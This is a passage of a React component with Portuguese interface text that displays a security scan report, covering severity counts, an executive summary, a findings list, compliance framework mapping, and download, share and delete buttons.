              <div className="grid grid-cols-4 gap-3 w-full max-w-sm mt-6">
                {(
                  [
                    ['Critica', report.vulns.critical, '#ff0044'],
                    ['Alta', report.vulns.high, '#ff4444'],
                    ['Media', report.vulns.medium, '#ffb800'],
                    ['Baixa', report.vulns.low, '#00ff88'],
                  ] as const
                ).map(([label, count, color], i) => (
                  <motion.div
                    key={label}
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: 0.3 + i * 0.1, duration: 0.5 }}
                    className="flex flex-col items-center p-3 rounded-xl"
                    style={{
                      background: '#0a0a0f',
                      border: '1px solid rgba(255,255,255,0.06)',
                    }}
                  >
                    <span className="font-space text-xl font-bold" style={{ color }}>
                      {count}
                    </span>
                    <span className="text-[10px] font-medium mt-0.5" style={{ color: '#6a6a82' }}>
                      {label}
                    </span>
                  </motion.div>
                ))}
              </div>
            </div>

            {/* Right: Summary Text */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.3, duration: 0.5 }}
            >
              <h2 className="font-space text-xl font-semibold text-text-primary mb-4">
                Resumo Executivo
              </h2>
              <div className="space-y-3">
                {report.summary.map((para, i) => (
                  <p key={i} className="text-sm leading-relaxed" style={{ color: '#a0a0b8', lineHeight: 1.7 }}>
                    {para}
                  </p>
                ))}
              </div>

              {/* Quick Stats */}
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 mt-6 pt-4" style={{ borderTop: '1px solid rgba(255,255,255,0.06)' }}>
                <div>
                  <p className="text-[10px] font-medium uppercase tracking-wide" style={{ color: '#6a6a82' }}>
                    Total Vulns
                  </p>
                  <p className="font-space text-lg font-bold text-text-primary mt-0.5">{totalVulns}</p>
                </div>
                <div>
                  <p className="text-[10px] font-medium uppercase tracking-wide" style={{ color: '#6a6a82' }}>
                    Scan Mode
                  </p>
                  <p className="font-space text-lg font-bold text-text-primary mt-0.5">{report.scan_mode}</p>
                </div>
                <div>
                  <p className="text-[10px] font-medium uppercase tracking-wide" style={{ color: '#6a6a82' }}>
                    Duracao
                  </p>
                  <p className="font-space text-lg font-bold text-text-primary mt-0.5">{report.duration}</p>
                </div>
              </div>
            </motion.div>
          </div>

          {/* Vuln Bar */}
          <VulnBar vulns={report.vulns} />
        </motion.div>

        {/* ─── Vulnerability Findings ──────────────────────────────── */}
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.2 }}
          className="rounded-2xl overflow-hidden mb-6"
          style={{
            background: '#12121a',
            border: '1px solid rgba(255,255,255,0.06)',
          }}
        >
          <div className="px-6 pt-6 pb-2">
            <h2 className="font-space text-xl font-semibold text-text-primary">
              Vulnerabilidades Encontradas
            </h2>
            <p className="text-xs mt-1" style={{ color: '#6a6a82' }}>
              {report.findings.length} vulnerabilidades identificadas neste escaneamento
            </p>
          </div>
          <div className="mt-2">
            {report.findings.map((finding, i) => (
              <FindingItem key={finding.id} finding={finding} index={i} />
            ))}
          </div>
        </motion.div>

        {/* ─── Compliance Mapping ──────────────────────────────────── */}
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.3 }}
          className="rounded-2xl p-6 sm:p-8 mb-6"
          style={{
            background: '#12121a',
            border: '1px solid rgba(255,255,255,0.06)',
          }}
        >
          <h2 className="font-space text-xl font-semibold text-text-primary mb-6">
            Mapeamento de Conformidade
          </h2>

          <div className="space-y-8">
            {report.compliance.map((framework, fi) => (
              <motion.div
                key={framework.name}
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ delay: 0.4 + fi * 0.15, duration: 0.5 }}
              >
                {/* Framework Header */}
                <div className="flex items-center gap-3 mb-4">
                  <div
                    className="w-9 h-9 rounded-full flex items-center justify-center"
                    style={{ background: framework.bg }}
                  >
                    <framework.icon size={18} color={framework.color} />
                  </div>
                  <div>
                    <h3 className="text-sm font-semibold text-text-primary">{framework.name}</h3>
                    <p className="text-[11px]" style={{ color: '#6a6a82' }}>
                      {framework.subtitle}
                    </p>
                  </div>
                </div>

                {/* Compliance Items */}
                <div
                  className="rounded-xl overflow-hidden"
                  style={{ border: '1px solid rgba(255,255,255,0.04)' }}
                >
                  {framework.items.map((item, ii) => {
                    const statusColor = item.vuln_count > 0 ? '#ff0044' : '#00ff88'
                    const statusBg = item.vuln_count > 0 ? 'rgba(255,0,68,0.1)' : 'rgba(0,255,136,0.1)'
                    const statusLabel = item.vuln_count > 0 ? 'Nao Conforme' : 'Conforme'

                    return (
                      <motion.div
                        key={item.code}
                        initial={{ opacity: 0, x: -10 }}
                        animate={{ opacity: 1, x: 0 }}
                        transition={{ delay: 0.5 + fi * 0.15 + ii * 0.05, duration: 0.4 }}
                        className="flex flex-col sm:flex-row sm:items-center gap-2 sm:gap-4 px-4 py-3 transition-colors duration-150 hover:bg-white/[0.02]"
                        style={{
                          borderBottom:
                            ii < framework.items.length - 1
                              ? '1px solid rgba(255,255,255,0.04)'
                              : undefined,
                        }}
                      >
                        <code
                          className="text-xs font-mono shrink-0 sm:min-w-[220px]"
                          style={{ color: '#00f0ff' }}
                        >
                          {item.code}
                        </code>
                        <p className="text-sm flex-1" style={{ color: '#a0a0b8' }}>
                          {item.description}
                        </p>
                        <div className="flex items-center gap-3 shrink-0">
                          <span
                            className="inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-medium"
                            style={{
                              background: item.vuln_count > 0 ? 'rgba(255,0,68,0.1)' : undefined,
                              color: item.vuln_count > 0 ? '#ff0044' : '#4a4a5e',
                            }}
                          >
                            {item.vuln_count > 0
                              ? `${item.vuln_count} vulnerabilidade${item.vuln_count > 1 ? 's' : ''}`
                              : 'Nenhuma'}
                          </span>
                          <span
                            className="inline-flex items-center px-2.5 py-0.5 rounded-full text-[10px] font-semibold"
                            style={{ background: statusBg, color: statusColor }}
                          >
                            {statusLabel}
                          </span>
                        </div>
                      </motion.div>
                    )
                  })}
                </div>
              </motion.div>
            ))}
          </div>
        </motion.div>

        {/* ─── Report Actions ──────────────────────────────────────── */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.4 }}
          className="rounded-2xl p-6"
          style={{
            background: '#12121a',
            border: '1px solid rgba(255,255,255,0.06)',
          }}
        >
          <div className="flex flex-col sm:flex-row items-center gap-4">
            <button
              onClick={handleDownload}
              className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-8 py-3.5 rounded-lg text-sm font-semibold transition-all duration-200 hover:brightness-110 hover:scale-[1.02]"
              style={{
                background: 'linear-gradient(135deg, #00f0ff, #00a0aa)',
                color: '#0a0a0f',
              }}
            >
              <Download size={18} />
              Baixar Relatorio PDF
            </button>
            <button
              onClick={handleShare}
              className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-6 py-3.5 rounded-lg text-sm font-medium transition-all duration-200 hover:bg-[rgba(0,240,255,0.08)] hover:border-[#00f0ff]"
              style={{
                background: 'transparent',
                border: '1px solid rgba(0,240,255,0.4)',
                color: '#00f0ff',
              }}
            >
              <Share2 size={18} />
              Compartilhar Relatorio
            </button>
            <button
              onClick={() => {
                if (confirm('Tem certeza que deseja excluir este relatorio?')) {
                  navigate('/reports')
                }
              }}
              className="w-full sm:w-auto sm:ml-auto inline-flex items-center justify-center gap-2 px-5 py-3 rounded-lg text-sm font-medium transition-all duration-200 hover:bg-[rgba(255,0,68,0.25)]"
              style={{
                background: 'rgba(255,0,68,0.15)',
                border: '1px solid rgba(255,0,68,0.4)',
                color: '#ff0044',
              }}
            >
              <Trash2 size={16} />
              Excluir
            </button>
          </div>
        </motion.div>

        {/* ─── Novo Scan CTA ───────────────────────────────────────── */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.6 }}
          className="flex justify-center mt-10"
        >
          <button
            onClick={() => navigate('/dashboard')}
            className="inline-flex items-center gap-2 px-6 py-3 rounded-lg text-sm font-medium transition-all duration-200 hover:bg-white/5"
            style={{
              background: 'transparent',
              border: '1px solid rgba(255,255,255,0.1)',
              color: '#a0a0b8',
            }}
          >
            <Zap size={16} />
            Iniciar Novo Scan
          </button>
        </motion.div>
      </div>
    </div>
  )
}
